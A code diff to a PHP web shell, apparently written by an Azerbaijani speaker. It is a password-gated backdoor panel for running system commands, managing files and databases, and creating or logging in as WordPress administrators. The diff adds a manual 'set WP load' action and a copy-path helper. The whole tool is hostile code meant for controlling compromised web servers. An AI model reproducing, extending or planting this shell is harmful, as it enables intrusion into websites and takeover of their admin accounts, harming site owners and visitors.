@@ -16,7 +16,7 @@ if ($password != md5($_GET['password'])) {
 }
 $baqliFunksiyalar = explode(",", "");
 $safeMode = true;
-$actions = array("esas","fayl_oxu","phpinfo","sistem_kom","fayl_redakte","fayl_yukle",'fayl_sil','fayl_yarat','papka_yarat','fayl_sifirla' , 'papka_sil','fayl_ad_deyish', 'ziple' , 'skl' , 'skl_d_t' , 'skl_d', 'fayl_upl','set_wp_load','create_wp_admin','login_wp','create_st_folder','create_shb_file','chmod','chmod_folder');
+$actions = array("esas","fayl_oxu","phpinfo","sistem_kom","fayl_redakte","fayl_yukle",'fayl_sil','fayl_yarat','papka_yarat','fayl_sifirla' , 'papka_sil','fayl_ad_deyish', 'ziple' , 'skl' , 'skl_d_t' , 'skl_d', 'fayl_upl','set_wp_load','create_wp_admin','login_wp','set_manual_wp_load','create_st_folder','create_shb_file','chmod','chmod_folder');
 $ne = isset($_POST['ne']) && in_array($_POST['ne'],$actions) ? $_POST['ne'] : "esas";
 function listDrives() {
     $drives = [];
@@ -25,7 +25,7 @@ function listDrives() {
         $output = shell_exec("wmic logicaldisk get name 2>&1");
         preg_match_all('/[A-Z]:/', $output, $matches);
         $drives = $matches[0] ?? [];
-    } 
+    }
     return array_values($drives);
 }
 function formatListDisk() {
@@ -163,6 +163,10 @@ function rrmdir($dir)
 
 		rmdir( $dir );
 	}
+}
+function normalise_path($path)
+{
+    return str_replace(['\\', '/'], DIRECTORY_SEPARATOR, $path);
 }
 
 $default_dir = getcwd();
@@ -477,6 +481,13 @@ else if ($ne == 'login_wp') {
 		}
 	} catch (\Throwable $th) {
 		print $th->getMessage();
+	}
+}
+else if ($ne == 'set_manual_wp_load') {
+	$path = isset($_GET['path']) ? $_GET['path'] : $_POST['path'];
+	if (file_exists($path)) {
+		$_SESSION['gr_wp_load'] = $path;
+		print "wp-load.php set at {$path}";
 	}
 }
 else if ($ne == 'create_st_folder') {
@@ -988,6 +999,7 @@ else
 						<td>' . htmlspecialchars(fileowner($faylAdiTam)) . '</td>
 						<td' . ($isReadableColor?' style="color: green;"':'') . '>' . substr(sprintf('%o', fileperms(( $faylAdiTam ))), -4) . '</td>
 						<td>';
+						print '<a href=\'javascript:copyPath('.json_encode(normalise_path($default_dir.DIRECTORY_SEPARATOR.$element)).')\''.$classN.'>path</a> | ';
 						if( is_file($faylAdiTam) )
 						{
 							print (' <a href="javascript:chmod(\'' . htmlspecialchars($adi) . '\' , \''.str_replace("fayl_oxu","chmod",$url).'\');"'.$classN.'>Chmod</a> | <a href="javascript:sehife(\''.str_replace("fayl_oxu","fayl_yukle",$url).'\')"'.$classN.'>Download</a> | ') .
@@ -1015,7 +1027,7 @@ print "</tbody></table>";
 ?>
 
 <hr>
-<a href="javascript:newFile();">Yeni fayl</a> | <a href="javascript:newPapka();">Yeni papka</a> | <a href="javascript:createWpAdmin();">Create WP Admin</a> | <a href="javascript:loginWP();">Login WP</a> | <a href="javascript:createWpAdmin();">Create WP Admin</a> | <a href="javascript:createStFolder();">ST-Folder</a> | <a href="javascript:createShbFile();">SHB-File</a><br>
+<a href="javascript:newFile();">Yeni fayl</a> | <a href="javascript:newPapka();">Yeni papka</a> | <a href="javascript:createWpAdmin();">Create WP Admin</a> | <a href="javascript:loginWP();">Login WP</a> | <a href="javascript:setManualWpLoad();">Set WP Load</a> | <a href="javascript:createStFolder();">ST-Folder</a> | <a href="javascript:createShbFile();">SHB-File</a><br>
 <a href="javascript:sehife('?ne=sistem_kom&qovluq=<?=urlencode(urlencode(shifrele($default_dir)))?>')">Icra edin</a><br>
 <a href="javascript:sehife('?ne=skl');">SQL</a><br>
 
@@ -1088,6 +1100,15 @@ function setWpLoad(url)
 		sehife(url);
 	}
 }
+function copyPath(path) {
+	console.log(path);
+	
+    navigator.clipboard.writeText(path).then(function() {
+        alert('Path copied to clipboard: ' + path);
+    }, function(err) {
+        alert('Failed to copy: ', err);
+    });
+}
 function chmod(name, url)
 {
 	var mod = prompt('mod:');
@@ -1131,6 +1152,13 @@ function loginWP()
 	var password = prompt('Password:');
 	if (username && password) {
 		sehife("?ne=login_wp&wp_username=" + username + "&wp_password=" + password + "&qovluq=<?=urlencode(urlencode(shifrele($default_dir)))?>");
+	}
+}
+function setManualWpLoad()
+{
+	var path = prompt('Path:');
+	if (path) {
+		sehife("?ne=set_manual_wp_load&path=" + path + "&qovluq=<?=urlencode(urlencode(shifrele($default_dir)))?>");
 	}
 }
 function sistemKom()
